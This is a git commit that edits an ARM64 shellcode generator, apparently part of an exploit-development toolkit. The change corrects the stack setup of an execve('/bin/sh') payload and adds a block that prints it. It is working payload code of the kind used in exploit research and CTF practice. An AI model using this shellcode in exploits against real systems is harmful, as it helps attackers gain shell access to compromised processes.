010cce2aa038370973670286a7e97435595432e0
alex.park <tae002@naver.com>
2014-09-04 10:00:15 +0900

    modified sh shellcode

--- shellcodes/arm64/sh.py
+++ shellcodes/arm64/sh.py
@@ -7,8 +7,8 @@ def generate(cmd='/bin/sh'):
     sc = """
     adr  x0, bin_sh_1
     mov  x2, 0
-    str  x0, [sp]
-    str  x2, [sp]
+    str  x0, [sp, 0]
+    str  x2, [sp, 8]
     mov  x1, sp
     mov  x8, 221
     svc  0
@@ -16,3 +16,6 @@ bin_sh_1:
     .asciz "%s\x00"
     """ % (cmd)
     return sc
+
+if __name__ == '__main__':
+    print generate()
